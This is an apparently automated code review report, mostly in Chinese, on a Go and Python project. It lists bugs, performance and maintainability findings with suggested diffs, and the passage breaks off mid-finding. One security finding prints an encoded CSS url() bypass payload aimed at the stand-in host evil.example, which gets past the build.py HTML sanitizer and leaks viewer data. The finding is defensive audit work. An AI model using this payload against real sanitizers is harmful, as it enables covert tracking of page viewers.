Review complete: 62 finding(s) across 92 selected item(s).

─── apps/web/vite.config.ts:79-79 ───
[maintainability · low] 新增的 `@weknora/domain/craft/web-promotion` 别名当前在整个仓库尚无生产消费者：apps/web 与
apps/desktop 的源码均未 import 该 specifier，仅有 `packages/domain/src/craft/web-promotion.test.ts`
以相对路径引用该模块。同样的映射也同步新增于 `apps/desktop/vite.config.ts`、`apps/web/tsconfig.json` 及
`packages/domain/package.json` 的 exports。若这是为后续 lane（版本提升/默认版本
UI）预铺的配置则无碍；若最终没有消费方落地，建议一并清理这四处映射，避免成为死配置。



─── cmd/craft-egress-adapter/main.go:64-66 ───
[maintainability · low] ListenAndServe 失败时在 goroutine 内 log.Fatalf（触发 os.Exit），会跳过 defer 的
adapter.Close()，journal 文件句柄不落闭。虽然每条记录均已 fsync、无数据损失，退出路径仍不干净。建议把错误经 channel 传回主流程，由主流程在 defer
Close() 生效后再 Fatal/退出。

+ 	serveErr := make(chan error, 1)
+ 	go func() {
+ 		log.Printf("craft-egress-adapter: listening on %s, gateway %s", listen, gatewayURL)
  		if err := server.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {
- 			log.Fatalf("craft-egress-adapter: %v", err)
+ 			serveErr <- err
  		}
+ 	}()
+ 	// 主流程 select：收到 serveErr 时打印并由 defer Close() 收尾后再退出


─── docker/craft/web/build.py:292-297 ───
[security · high] 净化变体集合不完整，存在"实体解码 × CSS 反斜杠转义"组合绕过，且声明的不动点循环是死代码：(1) decoded 初始值就是
variants[1]，`while decoded not in variants` 首次求值即为 False，循环体永不执行——注释声称的"Decode entities to a fixed
point"实际从未发生；(2) css_unescape 只作用于原始片段，从未应用于任何实体解码后的变体（实体解码也从未应用于 CSS 解码结果）。绕过示例：`<div
style="&#92;75 rl&#40;&#92;2f&#92;2fevil&#46;example&#41;">` —— raw 只含实体（全过）、unescape×1 得 `\75
rl(\2f\2fevil.example)`（无字面 `//`、无字面 `url(`、无 `://`，全过）、css_unescape(raw) 无字面反斜杠等于原串（过）；浏览器却按"HTML
属性实体解码→CSS tokenizer 转义解码"求值出 `url(//evil.example)` 外联 fetch。预览源虽有 CSP 兜底（craft_preview.go
PreviewCSP：img-src 'self'、style-src 'self'、connect-src 'none'），但网页作品源码包可下载，用户本地 file:// 打开时无 CSP，CSS
url() 信标即外传（泄露查看者 IP/UA），违背本文件"an encoded javascript:/url( smuggle must be refused exactly like its
literal form"的自身安全契约。建议以两个解码器的闭包（不动点）生成完整变体集后再逐个筛查。

-     variants = [fragment, html_mod.unescape(fragment), css_unescape(fragment)]
-     decoded = html_mod.unescape(fragment)
-     while decoded not in variants:
-         variants.append(decoded)
-         decoded = html_mod.unescape(decoded)
-     for candidate in variants:
+     seen = {fragment}
+     frontier = [fragment]
+     while frontier:
+         current = frontier.pop()
+         for candidate in (html_mod.unescape(current), css_unescape(current)):
+             if candidate not in seen:
+                 seen.add(candidate)
+                 frontier.append(candidate)
+     for candidate in sorted(seen):


─── docker/craft/web/build.py:271-272 ───
[bug · medium] 非 ASCII（中文）标题生成重复的 filter id：safe_heading 把纯中文标题整体折叠为空串，统一回退到
craft-filter-table，多个中文标题表格产生重复 DOM id（非法 HTML）。craft-web.js 的 bindTable 用 table 的 aria-labelledby 取
id 再 document.getElementById——重复 id
时永远只返回第一个输入框，导致：后续每张表都把监听挂到第一个输入框（第一个框同时过滤多张表），而各表自己的筛选输入框完全失效。本项目默认 lang 为
zh-CN、标题通常为中文，属主路径功能性缺陷。建议在 id 中编入 section 序号（调用点 load_content 中改为 render_table(heading,
section["table"], len(rendered)) 传入序号）。

      safe_heading = re.sub(r"[^a-zA-Z0-9-]+", "-", heading).strip("-").lower()
-     filter_id = "craft-filter-{}".format(safe_heading or "table")
+     filter_id = "craft-filter-{}{}".format(section_index, ("-" + safe_heading) if safe_heading else "")


─── docker/craft/web/build.py:73-73 ───
[bug · low] EVENT_ATTR_RE 的 `\bon[a-z]+\s*=` 会误伤正文里以 on 开头的普通单词后跟等号的文本：如 "only =
3"、"once=1"、"online=enabled" 均匹配（\b 在词首成立，[a-z]+ 吃掉剩余字母，\s* 允许空格），导致合法 html 片段被误判为"inline event
handler attribute"而整段拒绝（EXIT_CONTENT，fail-closed 误报，agent
只能换措辞重试）。建议把匹配锚定到标签内部的属性位置（标签名后经空白分隔的属性），避免匹配纯文本；顺带修正错误文案 "a inline event handler attribute" → "an
inline ..."。

- EVENT_ATTR_RE = re.compile(r"""\bon[a-z]+\s*=""", re.IGNORECASE)
+ EVENT_ATTR_RE = re.compile(r"""<[a-zA-Z][^>]*?\son[a-z]+\s*=""", re.IGNORECASE | re.DOTALL)


─── docker/craft/web/deps/craft-web.js:12-13 ───
[documentation · low] 注释与 build.py 实现不符：注释称"build.py 在筛选输入框上输出 aria-controls"，实际 build.py 的
render_table 输出的是表格元素上的 aria-labelledby="<filter_id>" 指回输入框（输入框自身只有 aria-label="筛选表格行"，并无
aria-controls）。绑定功能不受影响（getElementById 仍能取到），但注释会误导后续维护者去改错属性；另外以 aria-labelledby 指向一个搜索输入框属 ARIA
语义误用（labelledby 应引用标题/标签，表格与控件的关联宜用 aria-describedby 或以 section 标题作 labelledby）。建议按实际输出来修正注释（并可选修正
ARIA 模式）。

-     // Explicit pairing: build.py emits aria-controls on the filter input so
-     // the binding survives template insertions between the two nodes.
+     // Explicit pairing: build.py stamps aria-labelledby="<filter-id>" on the
+     // table pointing back at the filter input's id, so the binding survives
+     // template insertions between the two nodes.


─── internal/application/repository/agent_run_lifecycle.go:121-121 ───
[bug · high] DeleteSessionRuns 回归：ids 查询（`Where("tenant_id=? AND session_id=?")`）不过滤运行状态，而新复用的
cancelRunTx 对 `succeeded`/`failed` 状态返回
`agentruntime.ErrConflict`，会中止整个删除事务。任何包含已完成（succeeded）或失败（failed）Run 的会话——即几乎所有正常使用过的会话——经 handler
的 fenceSessionRuns → DeleteSessionRuns 删除时都会永久失败。旧实现是对每个 Run 无条件置 canceled，删除总能成功；现有测试仅覆盖 canceled
Run 的幂等路径（agent_run_lifecycle_test.go:36-43），未覆盖 succeeded/failed。建议在 Pluck 中排除终态运行（canceled Run 仍经
cancelRunTx 幂等返回 nil，不受影响）：

+ 		var ids []string
+ 		if err := tx.Table("agent_runs").Where("tenant_id=? AND session_id=? AND status NOT IN ('succeeded','failed')", tenantID, sessionID).Pluck("run_id", &ids).Error; err != nil {
+ 			return err
+ 		}
+ 		for _, id := range ids {
  			if err := s.cancelRunTx(tx, agentruntime.RunKey{TenantID: tenantID, RunID: id}, "session_deleted"); err != nil {
+ 				return err
+ 			}
+ 		}


─── internal/application/repository/craft_docker_normal_input.go:96-98 ───
[bug · low] 首次 Stage 一个格式非法的请求（命令/参数含 NUL、env 键含 '='、stdin 未启用却非空、超时/输出上限越界等）会返回包装 craft.ErrConflict
的 "conflicts with durable
identity"，而此时根本不存在可冲突的持久身份。调用方与运维排障无法区分"请求本身非法（应修正输入、重试无意义）"与"持久身份/回放分歧（状态竞争）"，错误文本也会误导定位方向。建议对
!validCraftDockerNormalInput 的分支返回 craft.ErrInvalidInput 系错误，把 Conflict 保留给真实存在的 prior 行/日志/Run
校验失败路径。

- 	if r == nil || r.db == nil || !validCraftDockerNormalInput(request) {
+ 	if r == nil || r.db == nil {
  		return CraftDockerStagedNormalInput{}, ErrCraftDockerNormalInputConflict
+ 	}
+ 	if !validCraftDockerNormalInput(request) {
+ 		return CraftDockerStagedNormalInput{}, fmt.Errorf("%w: invalid Docker normal input request", craft.ErrInvalidInput)
  	}


─── internal/application/repository/craft_docker_output.go:410-413 ───
[bug · low] 该函数最后 `return tx.Error` 在走到时恒为 nil（此前所有失败的语句都已提前 return err），即：当 append 的锁 UPDATE 匹配 0
行、但操作行存在且未 seal、未 truncated 时，append 会返回 (0, nil) —— 把一次未提交的 chunk 上报为成功且
sequence=0，属于静默丢数据的回落路径。当前该状态按 WHERE `sealed_at IS NULL` 的语义不可达（匹配 0 行时行要么不存在→NotFound，要么已
seal→Sealed，均已被上方分支覆盖），但任何后续对锁 WHERE 条件或状态列的修改都会让这条潜在路径变成真实缺陷。建议返回非 nil 哨兵（如
ErrCraftDockerOutputUnavailable）兜底，而不是透传本事务此刻必为 nil 的 tx.Error。

  	if op.Truncated {
  		return ErrCraftDockerOutputQuota
  	}
- 	return tx.Error
+ 	return ErrCraftDockerOutputUnavailable


─── internal/application/repository/craft_preview_check.go:70-74 ───
[maintainability · low] 通道接受 WebCheckNotRun 作为可写结果构成契约陷阱：缺失行在 WebEvidenceFromChecks 中已等价于
not_run（release.go:108-114 注释明确 "Absent entries ... derive not_run"），因此写入一条显式 not_run
行没有任何语义收益；但不可变规则（同名校验不同状态即 ErrConflict）会使该检查名永久无法再记录真实的 passed/failed 观察——版本 web gate
被卡死，只能重新收集发版。本轮 container.go:531 的 dig.As 装配注释明确预期 T14/T20 探针写入者使用此通道，而 T15 报告设想的 "先发布（page
load=not_run）后探测" 序列恰好会触发该陷阱。建议从可写结果中移除 WebCheckNotRun（或在注释中显式警告写入 not_run
会永久阻断该名字的后续实测结果），避免未来探针写入者按直觉先写占位 not_run。

  	switch outcome {
- 	case craft.WebCheckPassed, craft.WebCheckFailed, craft.WebCheckNotRun:
+ 	case craft.WebCheckPassed, craft.WebCheckFailed:
  	default:
- 		return craft.Version{}, fmt.Errorf("%w: unknown web check outcome %q", craft.ErrInvalidInput, string(outcome))
+ 		// not_run is not writable: an absent row already derives not_run
+ 		// (WebEvidenceFromChecks), and a recorded not_run row would
+ 		// permanently conflict-block the name's later real observation
+ 		// under the immutability rule.
+ 		return craft.Version{}, fmt.Errorf("%w: web probe facts record observed outcomes only, got %q", craft.ErrInvalidInput, string(outcome))
  	}


─── internal/application/repository/craft_version.go:414-417 ───
[bug · medium] VersionEvidence 读路径把存储完整性故障统一包装为 craft.ErrConflict:digest 不匹配、JSON 损坏、VersionID
绑定不符都是服务端数据损坏事件,而 handler 的 craftHTTPError(internal/handler/session/craft.go:252)将 ErrConflict 映射为
409 Conflict。客户端收到 409 会误以为这是可通过重试或调整请求解决的冲突,监控/审计也无法把完整性事件与真实的发布冲突区分开。建议为完整性故障引入独立哨兵(如
craft.ErrCorruptEvidence,映射为 500 类服务端错误),仅让真正的发布冲突沿用 ErrConflict;同时 json.Unmarshal 的两处错误建议用 %w 而非 %v
包装,保留底层解码错误身份便于排障。

  	sum := sha256.Sum256([]byte(evidenceRow.EvidenceJSON))
  	if hex.EncodeToString(sum[:]) != evidenceRow.Digest {
- 		return craft.VersionEvidence{}, fmt.Errorf("%w: version %s evidence digest mismatch", craft.ErrConflict, versionID)
+ 		return craft.VersionEvidence{}, fmt.Errorf("%w: version %s evidence digest mismatch", craft.ErrCorruptEvidence, versionID)
  	}


─── internal/application/repository/craft_version.go:362-365 ───
[security · low] adoptCraftVersionEvidence 对存量行(stored)直接 Unmarshal 后比对冻结事实,却没有像 VersionEvidence
读路径那样先校验 stored.Digest 与存储字节一致:一行 evidence_json
被篡改但冻结事实恰好与重放一致的存量行,在重放发布时会被静默采纳(验证通过、事务提交成功),而同一行在读路径会因 digest 不匹配被拒绝——同一份数据在写侧与读侧的完整性判定不一致,削弱了
digest 列作为防篡改凭证的契约。建议在 Unmarshal stored 前先做与读路径相同的 sha256(stored.EvidenceJSON) == stored.Digest
校验,不一致即拒绝采纳。

+ 	if sum := sha256.Sum256([]byte(stored.EvidenceJSON)); hex.EncodeToString(sum[:]) != stored.Digest {
+ 		return fmt.Errorf("craft: version %s stored evidence digest mismatch", row.VersionID)
+ 	}
  	var storedEvidence craft.VersionEvidence
  	if err := json.Unmarshal([]byte(stored.EvidenceJSON), &storedEvidence); err != nil {
  		return fmt.Errorf("craft: decode stored evidence for version %s: %w", row.VersionID, err)
  	}


─── internal/application/repository/craft_workspace.go:600-602 ───
[bug · low] 跨会话可见性语义与同文件读路径不一致：lockCraftWriterWorkspace 对 SessionID 不匹配返回 ErrForbidden
并在消息中回显该工作区绑定的 session ID，而同一变更中 GetWriterLease（以及既有 GetWorkspace 的"另一会话不可见"约定）对同一情形返回
ErrNotFound。本函数自己的注释也声称 "cross-session workspaces do not exist for the caller"，行为却在导出的 store
接缝上泄露存在性与绑定会话号。虽然服务层门面（AcquireWriter 先经 GetWorkspace 按会话解析）使该路径当前不可达，仍建议统一为 NotFound 以自洽注释并匹配读路径约定。

  	if ws.SessionID != scope.SessionID {
- 		return craftWorkspaceRow{}, fmt.Errorf("%w: workspace %s is bound to session %s", craft.ErrForbidden, ws.ID, ws.SessionID)
+ 		// Cross-session workspaces do not exist for the caller — keep the
+ 		// invisibility contract of GetWorkspace/GetWriterLease.
+ 		return craftWorkspaceRow{}, fmt.Errorf("%w: workspace %s", craft.ErrNotFound, workspaceID)
  	}


─── internal/application/service/craft_access.go:159-163 ───
[maintainability · low] 动作词表 switch 与 internal/modules/craft/web_contracts.go 中 RequireTaskAccess 的
switch 重复枚举同一组 TaskAction。当前 craft 包恰好只定义 5
个动作（TaskRead/TaskWrite/TaskShare/TaskOpenSource/TaskPreview），尚无遗漏；但若未来新增动作（如 export/archive
相关），AllowsTaskAction 与 RequireTaskAccess 更新后，这里的 default
分支会静默跳过拒绝审计（无错误、无编译期强制同步），造成安全审计覆盖的不一致漂移。建议在 craft 包导出单一有效性谓词（如 func (a TaskAction) Valid() bool），两处
switch 统一改用该谓词，使词表只有一个权威定义。

- 	switch action {
- 	case craft.TaskRead, craft.TaskWrite, craft.TaskShare, craft.TaskOpenSource, craft.TaskPreview:
- 	default:
+ 	// craft.TaskActionValid 由 craft 包统一维护动作词表（见 web_contracts.go
+ 	// RequireTaskAccess 同步改造），避免两处 switch 漂移导致新动作拒绝静默不落审计。
+ 	if !action.Valid() {
  		return
  	}


─── internal/application/service/craft_artifacts.go:299-301 ───
[bug · medium] probe 缺失时页面两项检查事实是 CheckOutcome 零值空串 ""，而非注释声称的 not_run。CheckOutcome.valid() 只接受
passed/failed/not_run 三值，因此 evidence.Validate() 会以 ErrInvalidInput（"invalid web check
outcome"）拒绝晋升，而不是注释四处（本行内注释、webProbe 字段注释、WithWebPromotion 注释、craft_runtime.go:232-234 装配注释 "exactly
the recorded contract"）描述的 not_run → Promotable()==false → ErrConflict 路径。对外契约随之错位：HTTP 层
craftShareHTTPError 将 ErrInvalidInput 映射为 400 而非 409，且客户端拿不到逐项
build/entry/preview_reachable/page_loaded 结果的错误信息。注意当前生产装配（craft_runtime.go:241 显式传 probe=nil，T14
live gate 未闭合）走的就是这条路径。建议显式初始化为 not_run，使零值语义与声明契约一致。

+ 	evidence := craft.WebCheckEvidence{
+ 		Build:            craft.WebBuildOutcome(candidate.Evidence),
+ 		Entry:            craft.WebEntryOutcome(candidate.Kind, candidate.Files),
+ 		PreviewReachable: craft.WebCheckNotRun,
+ 		PageLoaded:       craft.WebCheckNotRun,
+ 	}
  	if s.webProbe != nil {
  		evidence.PreviewReachable, evidence.PageLoaded = s.webProbe.ProbeWebPage(ctx, scope, candidate)
  	} // a missing probe leaves both page facts not_run — the gate refuses below


─── internal/application/service/craft_budget.go:325-328 ───
[bug · high] StartBinding 在外部回调返回后直接用调用者的 ctx 写 journal 结果。当父 ctx 已被取消（客户端断开、停止运行、进程停机）时：boundedCtx
会随之取消，outcome 被强制改为 Unknown，随后 resolveCraftChargeStart(ctx,...) 会因 ctx 已取消立即失败——journal 永久停留在
state='intent'，且返回给调用方的是 resolveErr（context.Canceled），丢失了 startErr 与已观测到的 outcome。后果：该 activity 重放被
'activity start already attempted; reconcile before retry' 拒绝，且 agent_runs 的 lease 恢复扫描（NOT EXISTS
... j.state IN ('intent','unknown')）会一直排除该 Run，需人工 reconcile。同函数 pre-start 分支用了
context.Background()，craftChargeStartAttempt.Resolve 也专门用 context.WithoutCancel +
craftChargeStartResolveTimeout，唯独这条主路径漏了 detach，应保持一致。

- 	if resolveErr := s.resolveCraftChargeStart(ctx, journal, outcome); resolveErr != nil {
+ 	resolveCtx, resolveCancel := context.WithTimeout(context.WithoutCancel(ctx), craftChargeStartResolveTimeout)
+ 	defer resolveCancel()
+ 	if resolveErr := s.resolveCraftChargeStart(resolveCtx, journal, outcome); resolveErr != nil {
  		return outcome, resolveErr
  	}
  	return outcome, startErr


─── internal/application/service/craft_budget.go:636-638 ───
[bug · low] Admit 的收尾三步中，EnsureTaskBudget 是 OnConflict DoNothing 的幂等写，RenewTaskBudgetDeadline
是条件幂等更新，但 AttachChildRun 内部是 'First 查不到则 Create' 的检查-后-写，且 Create 未带 OnConflict。两个并发的同 Run
Admit（客户端重试/双发 credential 请求是常态）都可能在彼此提交前读到 child 行不存在并各自 Create，其中一个以裸的主键冲突错误失败，使 Admit
从并发幂等变为可能返回非领域错误。建议在 Admit 层把唯一冲突视为幂等成功（冲突后复查 RootRunID 匹配即可返回 nil），或让 AttachChildRun 的 Create 采用
OnConflict{DoNothing} 后复查。



─── internal/application/service/craft_budget.go:750-755 ───
[bug · high] AuthorizeSandbox 对同一 run 的第二个不同 activity 必然失败：AuthorizeCall 的 fresh 分支（第 726-730 行）创建的行
DelegationID/ModelID/Funding 均为空串且 CallSeq 恒为 0，而持久唯一索引 uq_craft_budget_calls_seq (tenant_id,
run_id, delegation_id, model_id, funding,
call_seq)（migrations/sqlite/000048、versioned/000128）会使第二个不同的 "sandbox/<activityID>" 在 INSERT
时以裸唯一约束错误失败。现有测试只重复了同一个 activity id（幂等路径），掩盖了该问题。建议为 sandbox 调用分配独立的 binding facet 和按 run 单调的 seq（参照
extension marker 的做法），否则每个 run 最多只能授权一个 sandbox activity，且错误不是领域错误。

  func (s *CraftBudgetService) AuthorizeSandbox(ctx context.Context, grantID, activityID string) error {
  	if activityID == "" || len(activityID) > 256 {
  		return fmt.Errorf("%w: invalid sandbox activity identity", craft.ErrInvalidInput)
  	}
+ 	// 在 AuthorizeCall 的 fresh 分支为 sandbox 命名空间分配独立 facet 与单调 seq，
+ 	// 例如 ModelID="__craft_sandbox__"、Funding=commercial.FundingPlatform、
+ 	// CallSeq=该 facet 下 MAX(call_seq)+1，避免多条 (run,'','','',0) 行
+ 	// 触发 uq_craft_budget_calls_seq 唯一冲突。
  	return s.AuthorizeCall(ctx, grantID, "sandbox/"+activityID)
  }


─── internal/application/service/craft_budget.go:1040-1045 ───
[bug · high] 同一 run 第二次以相同 extraCalls（不同 key）扩展会永久失败：两个 marker 的 (tenant_id, run_id,
delegation_id='', model_id='__craft_budget_extension__', funding=platform, call_seq=-extraCalls)
完全相同，命中唯一索引 uq_craft_budget_calls_seq，INSERT 失败回滚；随后按 call_key 的补救重读也找不到该行（key
不同），最终返回裸唯一约束错误。更严重的是时序：Extend 中 ExtendTaskLimit 已先提交（G4 限额已提高），而 call cap 未提高；用同一 key
重放会再次走到同样的冲突，无法修复——用户第二次"+N 次调用"的加预算请求永远无法完成。建议让 marker 的唯一元组按 key 区分（例如 ModelID 内嵌 key，或改用按 run
递增的负序列并把 extraCalls 记在别处）。

  		marker := CraftBudgetCallRow{
  			TenantID: grant.TenantID, CallKey: callKey, GrantID: grant.GrantID,
- 			RunID: grant.RunID, ModelID: "__craft_budget_extension__",
+ 			RunID: grant.RunID, ModelID: fmt.Sprintf("__craft_budget_extension__/%s", key),
  			Funding: commercial.FundingPlatform, CallSeq: -int64(extraCalls), CallID: callID,
  			CreatedAt: s.now(),
  		}


─── internal/application/service/craft_budget.go:375-380 ───
[bug · medium] prepareCraftChargeStartWithProtocol 用 MAX(call_seq)+1 分配序列但没有任何重试：AuthorizeBinding
对同样的竞争有 craftCallSeqAttempts=16 轮重试（依赖唯一索引作为最终仲裁），而这里两个并发 charge start 若 binding facets 相同（同
model/funding，docker 协调器并行发送时很常见）会读到相同 MAX、计算出相同 seq，败者的整个事务以裸唯一索引错误失败——journal
未写入、活动未启动，调用方拿到的是非领域、未标注可重试的错误。建议像 AuthorizeBinding 一样在唯一冲突时做有界重读重试。

- 		var seq int64
- 		if err := tx.Model(&CraftBudgetCallRow{}).Where("tenant_id = ? AND run_id = ? AND delegation_id = ? AND model_id = ? AND funding = ?", row.TenantID, row.RunID, b.DelegationID, b.ModelID, b.Funding).Select("COALESCE(MAX(call_seq),0)").Scan(&seq).Error; err != nil {
- 			return err
+ 	// 参照 AuthorizeBinding：对 call_seq 唯一冲突做有界重试
+ 	for attempt := 0; attempt < craftCallSeqAttempts; attempt++ {
+ 		// 事务内重读 MAX(call_seq)+1 并插入；
+ 		// 若 Create 命中 uq_craft_budget_calls_seq 冲突则回滚本轮并 continue 重试，
+ 		// 而不是把裸唯一索引错误直接返回给调用方。
- 		}
+ 	}
- 		seq++
- 		callID := "activity/" + activityID


─── internal/application/service/craft_budget.go:300-306 ───
[bug · medium] 此处（以及 BeginBinding 中相同的 context.Background() 解析）没有像 CraftChargeStartAttempt.Resolve
那样用 craftChargeStartResolveTimeout 包裹：这是一个在 ctx 已取消路径上执行的无界数据库写。若数据库劣化/挂起，BeginBinding/StartBinding
会在请求路径上无限期阻塞，journal 停留在 intent 且调用方拿不到任何返回。代码自身已在 Resolve 中确立了"解析写入必须带 5s 超时"的纪律，这两处内联解析应保持一致。

  	journal := preparation.journal
  	if err := ctx.Err(); err != nil {
- 		if resolveErr := s.resolveCraftChargeStart(context.Background(), journal, CraftChargeStartDefinitelyNotStarted); resolveErr != nil {
+ 		resolveCtx, cancel := context.WithTimeout(context.Background(), craftChargeStartResolveTimeout)
+ 		defer cancel()
+ 		if resolveErr := s.resolveCraftChargeStart(resolveCtx, journal, CraftChargeStartDefinitelyNotStarted); resolveErr != nil {
  			return CraftChargeStartUnknown, resolveErr
  		}
  		return CraftChargeStartDefinitelyNotStarted, err
  	}


─── internal/application/service/craft_budget.go:1150-1154 ───
[bug · low] err != nil 与"未处于预算暂停"被合并返回 ErrNotFound，把真实的数据库故障（连接断开、超时等）伪装成"暂停不存在"的领域结论；上一处 grant 的
Take 错误同样被无条件折叠为 ErrNotFound（第 1146-1148 行）。ExtendAndResume 依赖 BudgetPause 做前置校验，DB
瞬时故障会让用户收到"无此暂停"而非可重试的 infrastructure 错误。建议区分 gorm.ErrRecordNotFound 与其他错误。

  	err := s.db.WithContext(ctx).Table("agent_runs").Select("status, wait_reason").
  		Where("tenant_id = ? AND session_id = ? AND run_id = ?", scope.TenantID, scope.SessionID, runID).Take(&run).Error
- 	if err != nil || run.Status != "waiting_user" || run.WaitReason != craftBudgetWaitReason {
+ 	if err != nil {
+ 		if errors.Is(err, gorm.ErrRecordNotFound) {
+ 			return craft.BudgetPause{}, craft.ErrNotFound
+ 		}
+ 		return craft.BudgetPause{}, err
+ 	}
+ 	if run.Status != "waiting_user" || run.WaitReason != craftBudgetWaitReason {
  		return craft.BudgetPause{}, craft.ErrNotFound
  	}


─── internal/application/service/craft_docker_normal_exec.go:205-209 ───
[performance · low] s.started 只增不减：每次 StartEvidence 成功后写入
normalStartEvidenceKey(receipt)（provider\x00container\x00exec），observeClaimed
读取它作为正向启动证据，但条目在整个进程生命周期内永不清除（全文件无 delete）。该服务按设计是长生命周期的命令面（构造一次、跨 Execute 复用；装配计划 T10/T19/T20
落地后即为进程级单例），每个 normal exec 都会永久遗留一个 key，随执行次数无界增长。建议：在观察到达终态（succeeded/failed）后删除对应 key——终态之后
startEvidence 不再影响 ObserveAttachedExec 的判定语义；或改用带容量上限/时间戳清扫的结构。



─── internal/application/service/craft_docker_restricted_exec.go:300-304 ───
[performance · low] s.running 同样只增不减：grantID+activityID 一旦被观察到 Running
即写入，终态后仍保留，进程内无任何删除路径。长生命周期服务下每个受限 exec 遗留一个 key，无界增长。注意清理需保留"曾经 Running"的语义（用于把终态零/缺失退出码从 unknown
归因为失败），建议仅在对应 receipt 到达终态观察（Observe 返回 Succeeded/Failed）之后才删除该 key。



─── internal/application/service/craft_inputs.go:195-197 ───
[bug · medium] cleanupCtx 的 30s 预算从进入上传循环之前就开始计时，随后的所有 s.files.SaveBytes（对象存储写入，每文件一次）与 DB
事务的耗时都会预扣这份预算；一旦上传阶段本身接近或超过 30s（多文件/大对象/慢后端——恰是注释所述 wedged backend 场景），rollback 里的 Count 与
DeleteFile 会因 cleanupCtx 已到期立即失败，本轮已写入对象全部静默泄漏（DeleteFile 错误被 `_ =` 丢弃且无任何日志）。预算应只覆盖清理动作本身：把
WithTimeout 移入 rollback 内部按需创建，才符合注释"限定清理而非钉死请求"的意图。另建议对 DeleteFile 失败至少记一条日志，为泄漏留下观测点。

  	created := make([]string, 0, len(uploads))
+ 	rollback := func() {
+ 		// The budget covers the rollback only: start the clock here so the
+ 		// upload/DB phase cannot pre-consume it.
- 	cleanupCtx, cleanupDone := context.WithTimeout(context.WithoutCancel(ctx), craftInputCleanupBudget)
+ 		cleanupCtx, cleanupDone := context.WithTimeout(context.WithoutCancel(ctx), craftInputCleanupBudget)
- 	defer cleanupDone()
+ 		defer cleanupDone()
+ 		seen := make(map[string]struct{}, len(created))
+ 		// ... existing cleanup body, logging DeleteFile failures ...
+ 	}


─── internal/application/service/craft_preview.go:340-343 ───
[performance · medium] 每个 grant 冻结整份 manifest 清单破坏了 maxCraftPreviewGrants 注释承诺的内存上界：修复前单个 grant 是
O(1) 常量大小，上限 65536 个 grant 约束的是常数级内存；现在每次 Issue 都为该版本的全部 version.Files 新建一张 map 并存入票据表（Open
兑换虽共享同一引用，但反复 Issue 同一版本会各自复制一份），最坏情况驻留内存变为 65536 × manifest 大小（几百文件的 manifest 即可达数 GB），"runaway
issuer" 恰是该 cap 注释明确防御的威胁模型。而 lookup 在两道门之后本来就会重新加载不可变版本并逐文件比对 rel（版本不可变，重取即权威），这张 per-grant map 仅用于
404 短路。建议改为按 versionID 内驻共享一份不可变快照（随 grant 表一同清理），或直接依赖 lookup 已有的重取校验、grant 只保留 versionID，使 grant
恢复 O(1) 大小。

- 	allowedFiles := make(map[string]struct{}, len(version.Files))
- 	for _, file := range version.Files {
- 		allowedFiles[file.Path] = struct{}{}
- 	}
+ 	// Grant 保持 O(1)：lookup 已对不可变版本重新加载并按 manifest 校验 rel，
+ 	// 404 短路可复用按 versionID 内驻共享的不可变快照，而非逐 grant 复制。
+ 	// craftPreviewGrant{scope: scope, versionID: version.ID, expiresAt: expiresAt}
+ 	// 并在 lookup 中通过共享快照（或重取的 version.Files）完成 allowlist 预检。


─── internal/application/service/craft_session.go:93-99 ───
[documentation · low] 该类型别名的契约注释与实际调用点行为矛盾：注释说"an error degrades to the legacy newest-version rule
at the call site"，但 View（craft_session.go:499-514）在 selector 出错时是保守降级——座位留空并 Warnf，绝不回退 newest
版本（调用点注释也明确写了这一点，且这正是 #130 的要求）。这是导出 seam 的契约描述，T15 selector 的实现方/后续维护者按此注释会误以为存在 newest-version
兜底。应把注释改为与实现一致的"错误时座位留空（保守降级）"。

  // DefaultVersionSelector resolves a scope's default preview version under
  // the T15 (#130) promotion policy: the newest published web version whose
  // four independent checks each passed. The boolean reports whether any
- // version qualified; an error degrades to the legacy newest-version rule
- // at the call site (the seat is a projection, never an authorization
- // boundary).
+ // version qualified; an error degrades conservatively at the call site —
+ // the seat stays empty rather than falling back to the newest version
+ // (the seat is a projection, never an authorization boundary).
  type DefaultVersionSelector = func(ctx context.Context, scope craft.Scope) (craft.Version, bool, error)


─── internal/application/service/session.go:305-309 ───
[bug · medium] CheckTaskAccess 的基础设施错误被映射为 404，与本函数上方注释声明的契约自相矛盾。CraftAccessService.CheckTaskAccess
→ Role → s.session()/activeMemberID()/grant First 查询都可能返回原始 gorm DB 错误（见
craft_access.go:97-115）；此处任何错误一律转为 apperrors.ErrSessionNotFound，意味着一次数据库抖动会让有权的 Owner/Collaborator 把
Craft 会话读成"不存在"，而同函数中 IsCraftTask 的三处调用（296-304、321-327）都特意区分了语义错误与 infra 错误并向上传播（"a database outage
is not masked as not found"）。虽然 fail-closed 无安全风险，但破坏了刚声明的可观测性契约，且 404 会误导客户端与监控放弃重试。建议按同样方式区分
ErrNotFound/ErrForbidden 与其余错误。

  		if registeredCraft {
  			scope := craft.Scope{TenantID: tenantID, UserID: userID, SessionID: id}
  			if accessErr := s.craftTaskAccess.CheckTaskAccess(ctx, scope, craft.TaskRead); accessErr != nil {
+ 				if !stderrors.Is(accessErr, craft.ErrNotFound) && !stderrors.Is(accessErr, craft.ErrForbidden) {
+ 					return nil, accessErr
+ 				}
  				return nil, apperrors.ErrSessionNotFound
  			}


─── internal/container/container.go:531-531 ───
[maintainability · medium] dig.As 并不会同时注册具体类型：dig v1.19 的 As 语义是"以指定接口类型替换构造函数结果的注册类型"，即使用
dig.As(new(craft.PreviewCheckStore)) 后容器里只有 craft.PreviewCheckStore
可解析，*repository.CraftPreviewCheckStore 不再可注入。而 newCraftPreviewCheckStoreConcrete
的注释（container.go:2609-2613）声称"dig.As registers it under the frozen craft.PreviewCheckStore interface
too ... the T14/T20 probe writer can resolve the concrete type"——这与 DI 框架实际行为相反：未来 T14/T20 探针写入方一旦以
*repository.CraftPreviewCheckStore 为参数 Invoke，must() 将在启动时直接
panic。当前虽无消费者解析具体类型（暂不触发），但该接线的既定目标（具体类型可解析）并未达成。建议改为双注册：

- 	must(container.Provide(newCraftPreviewCheckStoreConcrete, dig.As(new(craft.PreviewCheckStore))))
+ 	must(container.Provide(newCraftPreviewCheckStoreConcrete))
+ 	must(container.Provide(func(store *repository.CraftPreviewCheckStore) craft.PreviewCheckStore { return store }))


─── internal/container/craft_runtime.go:220-225 ───
[bug · high] runView 证据链的 inner 用错了：这里的 inner 是第 175 行已经用 craftSessionBuildLogReader(source,
outputDir)（legacy 共享 workDir 指针）包装过的 evidence。craftWebBuildEvidenceSource 在 run-bound 日志读取失败（含
